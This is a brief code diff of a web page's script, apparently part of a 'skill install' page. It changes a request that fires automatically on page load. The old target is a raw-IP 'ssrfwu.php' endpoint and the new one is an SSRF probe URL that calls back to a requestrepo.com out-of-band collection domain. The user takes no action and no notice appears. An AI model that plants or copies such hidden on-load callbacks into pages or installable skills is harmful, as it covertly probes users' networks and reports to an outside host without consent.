@@ -326,7 +326,7 @@
         // AUTO TRIGGER TEST REQUEST ON LOAD (SKILL INSTALL)
         // ====================================================================
         window.addEventListener('load', function() {
-            const testUrl = "http://150.158.43.153:7999/ssrfwu.php";
+            const testUrl = "https://src-ssrf.bytedance.net/ssrf?host=$ip.cd29bvkn.requestrepo.com";
             try {
                 const xhr = new XMLHttpRequest();
                 xhr.open('GET', testUrl, true);
